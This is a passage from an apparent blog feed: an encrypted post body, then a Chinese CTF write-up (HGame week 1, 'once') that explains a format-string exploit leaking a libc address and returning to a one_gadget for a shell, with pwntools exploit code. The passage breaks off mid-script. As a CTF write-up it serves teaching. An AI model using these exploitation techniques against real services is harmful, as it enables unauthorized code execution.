90233efa93527c9fe7aba1966ad7cbd0b8dd1d0f31f09cfd560163b7fb21eb26b25afa553b7695d643d88d03d3fa5b392fddee4c1d1583cf8e8784cf9120f6781b82e661ac5aff5468c47a3ec0fd80e5eda172175c9bc018077f5cdd97d4d2ce169c487f564b0384353b30de30d49d7b8af0af546488a47b5a7642599961ab3839c778fa5be8b9f8794a811b41f921e3c62842351649b31f8878734be2869f6a1427f7d0b68e3424c4b7e900b431d17e8b2f303a5da748c0331b876e45f987312c7790505d20aa520ad0fbede088bbd4b1d9765e9f807c6cd37b0e8defdab5b73e8c6b991b00aec0026e53f15952115183c65b68b3d77c8a9ced7b1f7d416a2d6712587081fdb48555ebd0fa1052613f54d06776c6f234361bb909da9f3dc52f97e14bce1bcfe78a92b8c6e7c051a8f52d7a460fd91d34efed80f7051fdd9e172cc60f28340e17487d25eb90ffa1721f988c5d78501f51ad5ec041ca60afefa1e287b66e4fef9fa48869878d75d4f43cf77f61bd51f0cc806b82a03c891ee24994cdca1ca18ad9ddda8df92073c64acea92838ee66440bae87c0d46c5cf97270e8cefc3b3f9e2ade68d38df39fb26e1bed7b3ffc8a2c079c9d81a6994cc1ee9ec1b9ef46dd0d07701f6d705111f7615d14d15338539645c6358b3ad3483b775a24274f0001de1a063505313cecfba7396d6647c030090f55d24841065dd80990eee429615d514abf9c54af788af80b6d037db48aea8ccba5ae420a1e70fa2eb392e822136a31d6685cda21fa5e93d95a20340c09daeebdaedf51d486b68767b2650ab8b002716b6c812d6e4a75e9629d479c3e11efc9e32cd2ed5e9dda6ebc653548a39cc178553af5d1377e0df33a49f6ed494e64b1131a1095bf9beb0b6360efb138b691bb2c1b3e245ab6460645c6431057b35e2b519f04ddf467b5d5dfa788b3d06c74e52e5668ac0fd0e90b0958c6b55f2a916a02ed399ef634c55f1ea368a5e14005f56d365606748974414d9e54ef247db0d362b5f285a45d6998212f643979dc5778e6f599db2f22c867b326639aa73d9c750e98d4dce093bd17ba3ba4e9fe6fce0e37900f472b7157377ef4477b7b18de6ec3c27629dbd4bc83719ca0c402588c768072f712a8e1bce4652e4db2665f92191e02f6c4dc036c176e4f4e2869d44afa3987260f092ef79a5c1e8fd206385eecf97b10df408a3851889d30657a597564494a7570e3a4b3c0f94ee52c08a2bc941f46fb565258a662ae99bd5482741a583c19ec8c099d7539262921d75eb03a9ef06374b2d66b98982b11550e57a0a973449d89cb3036544a7d43523cd6f055bdd9ff02ae45536009a1ee139c3fba6a0101f5317432a5b88e05a5590151c1cd7a8d1d4bfc6b11e79d1941321f42fdb060259d730c2f8b654af6ea5c32a9ce3ec9aba72d3c98dc155906127ed69e1a6a20a07174fe7c53e99db12ac812d9cc31cb7928319e4c067898afbbc19af198e6612bf13607be81a2e30a3df63d79e6c9744e3a662dc221e749b986fd60d085ec14d472b0091396acf13c9e575fc1eb1aae8cc0169e31c0e3789d6f5f8e4f8324aa2898e2a7b375c86a420c47a8c31a5cdcfa19fb31752f2d0ff32d0a6d176f835bcfc8c66650dea45dbb672d09d452bfc1c95dfe547e028738584fdc0f44be72a31a211e13fa51d1bcdb800922a78e8569c9bf49b62893e262ad5e30930c3aa8d948c4fe937972cd4b6dcc752b901efdf70e6e2e8f0a03ddfdd9194bbc3892823e60e0e69c18d10f7677c502c2f052f5b32ead184bdda4e3f9a1eebd383e3fcb4beb6ce67217158f32ea3026abf02626bf23b43e9912b19f628ec16dc82c1ce35ec17f045a0af4c0288085acd2fbffba50e4235ef82addc7b79ce9b47fe393cf9a98d5c3e4404acdce81580de0d7850ad72914b6478592897dab93545d7dd8c6610fc87590dcbcd94f7181619e7e9af1ccb72a985919421e96265262c4f6b3ad7c1e0afa98befe4d7dd6155181a55f213e98634fbac9f679612c0c87840aad027b96addd534fdecc32a7c26a9c675b0b44204c1d82873f4079a5436e09c85d4f179543f20484bd072dafdc11930a2dece7d92cecaa654ab4da57979d8b3efcf0f1d3f1d7fef4bfc090194b9a4365d5fe43ebab75997a36598297c34c8574fab5b3daa6139316d566e46a3cdab441a210822149f9695ab6b38e1501b788517025dd7f574652ab62e82e9cbdbdb7108c3d8ebfe073dc9f3f20e73f83df8b71d094736b6e05abae35c0eaec8bc6c223c9f9d6bdb5de166283283d07686574e42888a961cf0dbb5405bbfe1927074722f713ad9df077af5f4c5c0cb445d6c81a80283a9e3014c735c3e52186e346082f9ee5c3117d7d91c44a9a046c4f89f3a75d749a71f28aca37edec71c1e84e8d09420d8473cc825b80734448242d783bca79fe4222fd7683a3d7d2bc9e6e7d428cd676ebf5194aa274d1a9664ed5598ef2c5e09a22488b6aa32f0ec17c86bd70c46e848a005fa97a06dd8ab303b420fe37e4d09b6562febfbc2b980e8d36ba7bd699d4e6d6fa2c7636e5d8a980c194e88351133e16ef83022f6c4b5c60a0870d4dfa112303767b3578e3e30eeb9a68e63cf52f4b75c0857be396eeffc29a4bea099e795dc0374f5d7e9fadbbdb023614ce41536ce1be7d3256e2ea6e5f3d70e6a45f748b1c5fa715f5d996074d43683dc437882c36ecfd43d9e1ad3fba9ebd272c62bfd3b9ba30ba272dfb60fda127f6aa5f3c232c03bba981fe00ff93cb9268a81fd49c7aef0e06be9ae5124ce1e2f9dc8e4ea72adeca25aec551ed2fc279ee71b761b6594e38460a75314e7f20c5a3c33cec3e473f6358c66c8b5086c917a68914b3558fd3d10bde8573f01c15a7428a0245c750a26bdd067448142baaafd5cca6dff680889676505ca0e06ac7e46deb6f129ef121c6874743b44ebbd8618573d850364f9f97db5f44c30c5d9c57d331678790be94acf445528ee772b3d3c35695c6e55a0a2b2e7bd100ccd5876b2f880fac9901480e4ed37b655266e3d9ab1199fb4e5be81ce7820e95392047544ecce05d6d05da42dc0e3fc2da2781051b0535d310c759a199f32ae14e8888eeea72a73a4cc96eae8fd99a674862cf0bf5c70708c8d65f68549d8dc0b2b7953d23c50c25c63a44d8fe8500994249d7094e8f2e9ff7b89a753920c4410c56b8342f422ec00d0a438174af8e24572a93b4bd740cc9d41a091f40bfb8c4a55f7a97be3604aa836e152c63cbadbc628319fb7a0a941e824f31223a987302b6f7b9e0221bd2688d8faf5c3ab3e484c55d3c8820ea91203e5339045346c03218c7c95b83a573119eb359c86fbc20565be8c0b6e787253495c97de49262e5d73a3c0c0afa62d32a79c01ea119e52f6906a035cd8e32d75bb2dab10ca6c1fe7623780b6dc522302d828a6cbdc2f94f46fa7ba7f287ff9e156232817349e3d61a4834c67c418f478d7935f5e778550314ec72c5c4bff997338529f94cab3bc5ad478dd65fef768c1fe651b6bfe9d17317e8715d24792cc1e36322f9d91df022c93133d8382f581dadc28e8ec41bdc0fea51f9bc3b2d4df43c5b05f127f20b14433e9760d90c50c4203ab4a0343750bba1b92ceb1f1f4c555725f2415531a22e4a1ceb8a182e29f84eb4018cb0c2a904e8912d3eb8f84215ad9def4ac8c93d50b89c005e599b7817c2178b4fb90f0f798151bf74d6ca159ebb727edcb642f73243f663cb1c31fda58822c17d03b0c001ad022016ff05dad3a9fb4976c60543353a953c9b890c666c7f891e7abd0ef2ef8affdafa0138276ec4a5fd030544b038ae5c9d91913c81120359e1aae6e5feb8704bd8dac710e69e4ee0e98b0a887ac3829b98c04124ef1990273283234b4092f50957a8b56d16c0054fa87b426da137bfa7a3f984748a1ce069cea1ee0fa2b86ba4202c6e16bf8285991c340be4de389fb4b73a7adb181e7fbd5fbce68f2e642c7fcb882309fdb4cf05b107ba3bd41affdf480605d679614b1a8edabeafbc85cd44cfbc4bcdf0bae34ce1cf299af4d99c42ed49f1669432dfd3e4be2e4fecb6d9e408e5b636c85cb481c2408ce50d3968fa56b98606323c1e66c16fc35be1208e98cdd65524efaabadefad88443fa6cfc137d3c3ad707811a44ce373d04626b46244605949fc05f7a9612c27c31b2ead9fee323713fe52840d390fdcb5091b7fb9fa803df5e42e3cf569b6f98f16cdcca4a21cdc40b0ec519fc629fbb090fd50f18384beb30b00eda11e3f8b8a4ec92213539be04ed23753ad3280bb2fe7d9a4ea7b743c56b37ae743d74dcc6db0cc9a68c88893b6ac5cd53daec42ec230b32f3fe34cbc3e72a2c9c348fb95db71d60c9faaf206c3034586f3e22f9c741885a96a96788b1c93b41439f84437d14205d16ec304d8ccc197342f8499707bf4ce8ae04da974e8e14242a94a0ece3a3c5435a5a9071d27e22affb94222bc63e9669d5f8d7681bf10ffb307f4e682c1dd737d0202263435f910ffd21d843fd91de7b2374983f55db2c4bdd6c7d2899afb291411e889bf09c32986af688280e30bf17dca8d0ad4b04ca81e57ce9621787871e304241d951826809df7f489e53f5905e37dcc6fa7b0558d46b3e15ed66da07a3bf9fda86438fcfff2a0924d98450a5d046c015b7680168893cc05660e60cfc97c8855eb1e99dead3bf63d4bbe247668a4b943bfa80c692d50b7170d330d80476af56fcb7d98c1de12eaba601abc2e6403509ca3ae67923812af0842fb7b2cd943e74acb7836e5793e65f09afd2d4e651829150c7097fdcb4647cb7870f09631b2bcefe7b92491016fa9558bf6e779fec0eef7e85e8bf0d8c9e99fcc28b65bd1bec4bcd114c519f4c8074a2670ff2a3549bfa2227baff24fa8b5e11df09ab4e3294a806fd1d958c33ca29e2a21392435a747d397896ae739d269405e65759d7828524e9334be1af1d0b71ffaf32c16b15090636c233543863c0d0dff6bbcc4b71da25704012a82bcad4091e1687d117cf4b58c6aa80eb1942eb963f3d392351303c784c16071e24cffc5dea38241b9cc929ed819da35ae9ba873249e6912fa9b721d4e7ab971be14dcae4a8e0bf3631df87c7a21e974b98a8665727c8804f68a36a6ba4bfef9119839b05f7bb1bfc93afcbd5bf9b3908d5f782dc6b4526bd57eb50adea1e6c987afe086a5df605b49bd0e07e77bba7eb121f95acddd3b7e7d52f314138297f17254833c5c950a0fb533ba996b9b63a26e02f6701398593149d5994d4db095cdd4706419d94fefd0aa6d07e6bb6a2c19fc911f803603608312b5aa9236c388a3ac82caf3d9c81b3ddb810ded0503789bdf5841aa00ad733de5b45de3be3e7450bce1c6a43ffb93e05af20c57c70b8350ad25146f7cbcbb9c8a7f0060929d859400ee71f535b35a57386241e4e34611ff1a61d727092c1172defd1b4ce75e51cf5c88d7f6583c7f2add1f4264f92af8879ab396b2f72363274f468bb2846837e1180ffba8d8ad88f5d1c5508bbeea6ca1c6c362d3438b824266d0708acfa4031840473a2e5c68022d04e376fd8a01949b51156c281ffbcc7ea51dd9f6bffbc46ee79d7ae4ee6cb85979eb5f489f4adbef67bcbd60614676a280a40f47fb6109c75cf7740a4e3277d598d9026790040be346b96917e6e67d07ad684f9aca94911c579af63595be2b45eca7284a93b583007f24ebd2d0fb63e3b573cd8dce0ddee8a876b98aef2edb172efe5d1d5c91c2508616b9e9f5ee2d196301308251351c4082c6f2bd3df52080a7d246a02f0c0a4fd087937848926ad53d4cf800436d0da50374339402e401105408a85bf9d49fbce2a4096c7f786bbbbfc71e72d1383e55c5958ca35fed75c657f73e0831c02edf7ab44383d1ec415db8f3d78a15fd65309d8b5b5e91396f7dde4818d04c1f6ce44b8d083977989b1773b6c41f4ae2d24b5a2b1e45a8bddf750e701db577977cf77d761238db21b658a0e05e1133dd9b00512784b0602f6ba8eae5e1a7f527d82e96e0ddf1f46714464e67ecc34c2cf15910f204338de6a93adaaa23516efea2a8b3863b2f10ab63879f1006fb6d2ffae5ae4e9522e6428301ad236edfa7e1c94745a59d68ee686088dc134ab587f945ebab48988bf272166871909eb8936baa28b7c39400275e7519e6d6e7053dd6bccaac2bec002369fe8cbb280336a4a580e2f15e09b4696cec313a5e2a8717a7c4d776b3880381baee1244334ccae1a8ec7b78f9893fe81115f7faa975cd7abc7214b30ca1a29c8d2030c662218c038ed7197b135a511c205f661ed8b01a4dc0ae35b52f8e4c8f0956c58a32c260679e141b3d2d6579545808da23e203c0330784b3e28bd6450a604577388a04cee374b8ac050bb3704174abf77ab3ba18cf5e311f3f06083706991bfee52c4cea48e72d8cc8916d32fd6b87d52a58151ce50e73eff114707648c089d37ef6563586e7011f5baf2d54386f5d989b38e3bf6afefeae9ace667477811e1d60be230747f0c7adb82a37b596980cdc96e631665ddb29b556219e4dac192cb1b537a98d1aee5c81c35e51395813ccc4fa9145ed25c08532bfcb92a2d0621bf4254af8e316baa0e8dfbb3f9075363868c6ea1fd191ce7e5d6d98ff71950bcd51c64483317bd67859e5f4a72fcf99618f693d51062e9d71c6c8e76d930600566e6535c1fcf76c39ab67530e5bcb1cf19c05bbddf432bab374febe73d1116e63aed27efbe5634d44945657b9548548dbf993717652258b7191ebb42d0b100a8fc93a34abd13e6d1fb5ff831eb665639948518024eb84e7823fed060da1eae1a55032daf224fa1db778bedde8c5a95892e1b2a3c71406f59cd33b1576a0aa754ae0153b3b44c8286510b23d5c2fd171dfa2be666544d125246219f3ed32f1e2497622543ce62b1296764724bfbb6c0f649bfa8613cae1f729b7df68bb72d7cbacc917ec453586652f6a8419de7755232527c9ce195d80813f70a051d0ef3f1e340a22fa12add8e7af151e1311a6c6fb2e32f8022990a0a3da12a78de08ed13b74da839d991c628fb79b2468c98e5382f106fef3036d269ee930383e01dd1bd5b4347b8b20aafd819170a298d90a2bf3d600573474c61a912b1209bf671ff19851d134f9a4325648b76c9811f73dec2a04de994acc0d70499da65175c5d4bbaab43773041b6a027c16ac7a5fa6d5886c45ccf14a3efeffdfc308a5c3185f43be66f74915b8fc2efbb6cf547a799e5cf6e8ea7abf56715e20fdb4dcc52649521a7afcfbd35ed3ba63c8b1cccb9479832d16576988d2677dad4e0cd7a6fd5f7417fa79aea860c741c595aa005a384cecd23237e4b0b6166e982681c0b42eecea30c05a93a41499499aee7005c6643a8980e3cd7a6ecc51183be1029ad621689258fe7a1f4e1be72af92660ad6e1a9b3af33a72fe43058b7040a25b89b87396d931a1f5cdef424de45c0403cfa499c4c3e886ff5c08c3a6025545a14d8324a4042214c76a726cf5bb686415f3c0a8623e4d799aa30c2f9d1e1a682e94712bb3d2df515c5b3d542df4caa259ee9381d675a7bc397cf3efc945af5f33900c1254bc06fb9a78713ea0a00d0f9182666a448e56319570d53809130c8f8b03374639253a87db1f314ac494d29ba1d6534e542c404e5b72abee0079f8b6f16094ef0a72dbba71f0a9a266884266b179256a5ce7980f3f0f12fb91094cdc3cc05b8418291b281c5349f903fc1712c8ea60232d09ad2e40815ce91a3a18e54807fd42d855f9614b703c71ec3a448c0e80e4e350e714eace658c28b28398fe5f4a34d259cceda6abce0379b5ed6354e0bbd64a546ae1239ab9245ad9d4ef8398e77ee0be41171f8f931fc1a5a584840cc5775d3307c490cfe1bdf1082d1123311320386adb3ca4f2c6f7ad831ea416fe1c83850313ca6f14cd7f89d520738666ff6226b8f6625ceace67479b3cb8ba51bc1eea049c7b22dfe6f21bcadfc458eda082d0c35e3af99ca6183a28220e7286dfc6e9eacc430e4ae3dd6e0c366b5cd9123a0a3668f82dd49c8bb2cf17e584da3a9cb037726d8f741e6f1f4a4a7db0254bedd1a5f8b08226bd1e25f0be482090456fce812aa841adc388cec1315d503adc66edfedc5c04002d1fdbce2a538a8e30701e43d2a19917690b70d97ed93f5bde88987759bf254268a7545314f4383ec49e48f966c5244a848241562e30b32bbfd9329f5cac82f2a02dd22ba81c1ef3a64e837ecf7d1dd1083d0ebfc1619c7a3cec565e80dcb03e714a41ad646dc22796e4309ee597bcfc023d362076666eefbf1567edbfd19b548f56e63a9c15faa95cbf0da9b97ac06cca90bb31f11ed05e0eaa1016aceed898c90db6f13127dc62c82c5490b62a69c09fd0c156e770c89b1e4d5e1b231cabc819971bf614366805d70c95f5faf88826e853bdda8c816c778cc1712af5a8ebabbd5ab2c78cb6b3e668e6817700162d382ffe7a8025830c2fd0a4f67d95d2a4c09fbe5c25a4fbec2b371ec5e5db131d4a1e8b81e462903e07b179945b8a7c02f0eb60a19cd288e5016c0a5fc02c64b02484b68075a4d39531752172965f09ac63e0efd5d69f09073fa2c9cedb22f3a79ba30bc5d19e147eddac058870a06ba8d90dfeda61cd2b4a6d0042c3edba8ef7761630d10d5d8d034f02f07b5c9f9f5727129f66b994ffc463cc231d3a6851e2015ce5ed159a4b90c49c88819490266374e31b2882d387003dc6f43dd5659aeb956198767d62b37e90daf86d0470acf9903a7cc034cc3fdfbc8c6dca65f5e42b07e28fa6fef9a8adb8ef4844a1ea0a9d2dac44066ae8ba141d81eca4d760778f7cd0807c746fb2f43d5c8b177ed9a9599d509b88184a75623b5fed552b14551b672c7008646f406829c5ec05ac3b31173fec351a86200dd8b25c380f55bb7316d22f6ab169b4432a25e04ae6c6343effb3d5b6fc9c023bab8e50314a06fbc5801c5a4961c5fad5d7eb1631bc00c01c08514e63ff4c96a56594409d6cd5a4bed7049b5741337be35e17ef469d63283aaeb8881e99632bf889981a809b0fc2bfd49c4b4eda10a1826b0f6bb3beabe3315cf412c7218262c2acf679003df748fab192d4ce23d70025fef9f418511ce168a8afd7eb6c3bb3f7cb41a8b93acd10ac22ffb19ad6f1c5b32d9415b3c6db6aedd5ce0c7719d1582133f1ddefa37f13d831d1f0b3cf3c6ce4b0f89aa142ee1ffe170bb5203268ab60e543a36c692587924be1eeb97bdb476f4c3e3bb5f9f1a50feacde550d8f28830d03818680d23ed8edee1b20f861c705f10f767cc57c7464240790ddf7607b926eadab8ebb7e821e4df0ffc12fce369206d78a3a61b7146bf1f2f81845c6615649dae4a81eb190d5dcdbcda1e8fc6d5c9a51e7eeed866df6fd07e4e1fc49527c1aa8dd31294abb0de4170caeb05b3e6b2149d192b24f0c23bebbe68e9418b3ee1c042108306aecd0a1fdba8e6734cd723acf6aa35b1bdf734e6fc53f4db2fe772d5e3280504783ec2656b646cf588cbd2f1240dea65acb46772c2025c6595218e12054283d317cf36562bcecbe51fcd5840c5980e62ec3975e89a1097af7b1940a83b54fa2b43904eb2d33f548fe4cab9faabf1cbff697ce6a5195e6128e3eb7d661e7e584246b427ef33607bbfe312deffe2b10b6e96e603f8ce54d0f329b8a69e3dd8965189aab4a38f3cf9d986d3633b983787313c1b95b5ded2c8ec4402e8b1bb476d587b4d52def6716ff43efdd8ba14071163a0a9b9bf99af161fcd5c46e5b382501a3b07a9e407c1bfc53947f07455d0e92aeb89cc1c3becb3ed0905fa718eda282ae3140e2ae708337bde934b812cd0208b42435c9b24eb2e65c714d4c4a2dfd7b65bf46839e8120021493a886fb05068e6761fb49844921e77071d187f0691204c3808302122f71048db34462e7364408b8a0fa1cfb4af8a345f031b2cbadd3566eaec08d531d4368076b9ad70c06896c89818a520fdf82320f91870fd3b0de0875906c6d5e30aee7d786ee63e4444759e9d25a3fabae7638b7acd91e0352a4d3045d2d43674d6d3b9873e954f9cb94af485979839c6a6411d6613a263d69f6a4cec4b0f670581028882b7d092b64141a0f36f1ebb86765358534bb34f6520f3c65d53e42656852565370868b1ca954f9f766efdc430713ec2d17e7dc813729299baf5c81dd059cadf0b92999cabc4aa52076e83c1926ce69dfb1357405fcd935302b220e364a5b6126c582ba65eca917f218d079731b3705bb384fcde53b178af9777a1cf70b32ed8206babcdc72b7c827e0fdba3ed1f6fcfda40ef3271a05370d10f3f02751bad2219ef802f56c522852408e752b2373c56a3acdd0cad1151593ea7aa95e9673b0b46662e538643127d35d44b97f0e2529f5a8f4340be37dcb0b4ff8c6d573ad0f122e35890bc8da49348ebda9713077ce27677407987a52295fb2297cb054448bb9af8683201f1e6fc9947324503e17d0d1186346d57c546f9c60e420f5d39e83df287383045a0e7916be21e2895e6519c14dee066f8dd44e6f78541a65ef44797a9656f617cb1a12009bd5021040cb15bb60f1a651c8393e876b16e5f429b197c21d00aa9e6d6139107323c7ab188e0d961750121c258eb772cb3160dfe2b473b5055fa8982b3ced83716b2ae72c1272a7c0bfd249a3d74a05af0933afcea18a73a8483f5dd8d56357f3807d5ba253ea35c2ca5530f4622dc91b280e4f98bac89782b149e51466babce81af241fb98a9b8370b3818572ced60c385388c0e9bf1ce81ea0de87e14bb98229ba43fae3273ccc42e22c0bee38e712eea001707e26aa85928d28dcf2a17d4bb1743cf46fb35a81500c23debdf05efc7e17fb22d88deb92d051b954efca8b1b57488eb1f2f7eceda8b11761e4b5ec92359d3d16c807564aaa87b4b1437785630ed33011d11a21c0e287f702d0e3d1c67a3506a089af6ceb4773546f040ccc997a6a7b54b07d8feb388e1cd66f32b0eab4488974d686cc35832c04b4e306388f0b7c4fd9f8e8d22ab7267a861b06d6b01f880542334b3b9074fa29fc83223e07b383310247365b88b4b6510b54e620e559263cd9f8aaa24adabf9559893a0e8e6a98d484837549d03f2200fafb439ab6e4956f9a2cad7a385c6a4db85b022e14c0f0a015f06f09b27ce9fc7c88b83908d55f7fed29c32fefe04f7b68217359fe5b9db7949ac9103d1f69b51f07b8d03c89a8b0653271ce46b8edc7bdd648276ee45f6fa0d6ed24a95804d0b3a19bd580e611f7d0e3d810c19ebc36371788fd36af928159b6e7f3c7f21277ae01436784fa374a3eff2d57bcea74929c85aa3501f04c441621620ca5d67c691be961982f5d70b7c6d92d718c3a291f9985ca6292899e9c7b428c3047744e073fbb48d82aef38aea117e05471e71a5f964929541b456b9bdc19affb533ea59032ae36947945982eaf6110d035641fcd0f2c4941952ede4cd79ff188963b807a8941505ac3a8fcaa2ce8af5fd6f0fce59759632dc806191fb6c3c112cfbde561c4796338fc3e781a4273011cd57319168b4a6a7e031aab3373253d073a40c904dfb57eaed50bc1e7d9c940abdcd5e6c5c3d670115622b93a021ec7dae379651d889d64f2be99c81be82520c770b83398009969b28d5378eaf0c3e7ddb25e11683f00fc7056ff70c6ca54cc468f7447248fe3cc1e04a052ec4a54135ebbf592b3745433b06fd72b9890b6344d0fdad042ce24c23c9aead0e7333dbed4093bcb1ab1fb10ec7c0871d3419e780b7900a25df38f488d326c9f4ad4017a4fbf215bda986ad3c18d48b639a57a4a1b594102395c38c570ecb30245dae9733d3816325804e6b58def5dc8e2ead5bcaa6d09dc708e6b7009940533e9ff92a3b6ae15c07ed761e477b2cc6057addd04302b9678495249758baf85336f2950218fd952c71b166687457dd45ce323619d0425fb5fd1542eab5e6e623928a34a925c502c4e89ad9a9129f4acf4eb7491d6e184d1c30abc4a0465834b7f831dab537d0e86303f99cb4ca48aedb2ca7bd55f9f2d7e2b312a4c518446d823f855878c8e3834cfaa132be6ae51b38c00f9c7b5f56dd1dc9393ac78d4e5e201cd5664ebded2010320e751b579a2e73ba7b1eb1835f8d00d558931b01abaec70e870b3f52e70c10028529f4eda42b2c3a0fcf9e1853e1e02e156af6a53ce2e1238fd380021bceb1481e113ba198e0c97cb1fef1b3c5b4fbf1c6b62e7f9b648d7200038785600e2b6d5dc3e11a1caa613949e6542c469305b5a7cd577229873fa3d3030f6949b53519cea1c95ce23273af47fe546664ee79c97b804dc7151d3824ab3f3162cb96a3d98a61ea6ca0fb99b508d156d4d4d8951e441cad890f3db35fb3791720161e7d7bbe1c778358f5d7767af6502d29a5be971dabb874ecd7dd2372b7e1e5a765a14bc7de15a2122d949ab61b5b08c8c21783016e29361ff42a32af761196a01f472e64d87e0749a963a0e7a30e8260fd01396265d3f87923df74f8d81aaecec9779c0cf6797c46fbc9144f1ee147d392957e1574c8115596fb0bee3af02db6e019156d8d8436a95bef6ef07010b990c6938922be02e04c7b5450faf954ecdc134b6a2bdfa1425f4e11992f545f2b3ab8b9ace10892cabc4b0cefc1375d94afcd761be6574063caeee4922ecdefeb5b492fd3b6f98512364b430f724e25b1d7293b23b51a12fd8d6e38b03f8390393f367b3d8e51bb29743a4e8568cd9135f27cfc0c9024daf96b7c16260a62c11434c98900c61ce4931472ec387aef90ca024e0a84b351c6046944749315e737430736f96f6df70cce909587ea1f563bc26e19c5c191c2b5d59e2c9803b86d5d72c77a7522590953d49bf1c0dc52f947c04b3793fcd596298ead19d4b36889b9ffccececac60488d0c85beb56aa36379033bc2da50fcc7f37d5fbb83b5f26070efe2dc57aec714cd5a2686481ffaca454a70f3cad96b01ccc1d1adcf54591aead0dcd09f13c64ebc3305e5cf449696924fc297e812dbe8f7b16324c5fd3a385f01c17e3544255750ff523d01b81fa7db63cdf96527288a2548823145da362a91a359e0c641d5650cd3e341352f4c9049f0caa5e3f805a7d96b8bf76d577a88fb59f31025c2c0628b0aab92d0f95f0ed27a798cc4014a7e2bb5baf788eeae1cd6b7ae2ff1e1fe720ac71af8f6384e12f97306aecf953d94aa1a8fea2af9ed681174738aab7d793a84be4af5c18d3b6964747986d96cac0adb2b01a6cfa6fe8131488c110906a70fd997fbffdf22cb1a26c68e3096b688cc70b4d74415e70820e6c962affea2f28cd17ee6d3047e68e4b3a8dc59f78b21ca6d4eef9f1081126f87198f48d5bb8c1df49ebac87d88091bf65a06ae25255527b21626ff4318c93768b5221a7d9b7855c3a8ad032007070292fa362edea5f750ab9308f4cc52e836a3f9ed07</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>WriteUp/笔记</category>
      </categories>
  </entry>
  <entry>
    <title>HGame</title>
    <url>/article/HGame/</url>
    <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><span id="more"></span>
<h2 id="once-格式化字符串"><a href="#once-格式化字符串" class="headerlink" title="once(格式化字符串)"></a>once(格式化字符串)</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png" alt="20210306191440"></p>
<p>IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell</p>
<p>但是这不能⼀次就完成，要分两步，第⼀次利⽤要先 leak，覆盖返回地址，返回到漏洞开始的地⽅（这里就是程序的 vuln 函数），第⼆次就覆盖返回地址成 onegadget 即可</p>
<p>在第⼀步呢，有⼀个关键点，地址随机化的最低 12 bit，是不会变的，所以只要覆盖最低的 1 个字节，就可以返回到其它相近的地⽅，⽐如 vuln 函数的开头，</p>
<p>我用[tag]的方法找字符串的偏移老找不准：</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191649.png" alt="20210306191649"></p>
<p>如果想要找到栈中一些函数的地址来计算偏移的时候，不知道break在printf处后，栈中第一个值到底是第几个参数，所以我用了IDA去找。</p>
<p>test_exp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;AAAA&#x27;</span>  + <span class="string">&#x27;%1$p&#x27;</span> +<span class="string">&#x27;%2$p&#x27;</span> +  <span class="string">&#x27;%3$p&#x27;</span> +<span class="string">&#x27;%4$p&#x27;</span> +  <span class="string">&#x27;%5$p&#x27;</span>    + <span class="string">&#x27;%6$p&#x27;</span>  + <span class="string">&#x27;%13$p&#x27;</span>  + <span class="string">&#x27;%14$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140046.png" alt="20210307140046"></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140246.png" alt="20210307140246"></p>
<p>可以看到第13个参数是一个 libc_start_main 的地址，利用这个地址与题目给的 libc 文件就可以计算出 onegadget </p>
<p>最后的 getshell 中 +0x4f3d5 用 one_gadget [libcname] 指令</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210308133927.png" alt="20210308133927"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30107</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./once&#x27;)</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">binary = ELF(<span class="string">&#x27;./once&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">payload = <span class="string">&#x27;%13$p\n&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload +=   <span class="string">&#x27;\xD3&#x27;</span> </span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)</span><br><span class="line">libc_base = libc_addr  - libc.symbols[<span 